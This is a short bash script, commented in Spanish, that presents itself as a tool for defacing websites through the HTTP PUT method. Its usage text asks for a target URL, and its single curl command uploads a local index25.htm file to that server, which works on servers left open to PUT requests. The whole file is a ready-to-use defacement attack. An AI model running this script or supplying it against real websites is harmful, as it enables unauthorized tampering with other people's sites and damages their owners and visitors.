#!/bin/bash
# Simple bash para explotar web defacement por metodo PUT
#
echo "..."
echo 
echo "Web deface por metodo http PUT "
echo "Se requiere index25.htm em la misma carpeta donde esta esta script "
echo "Uso.: sh webdeface.sh URL "  
echo 
curl -v -X PUT $1/index25.htm -d @index25.htm


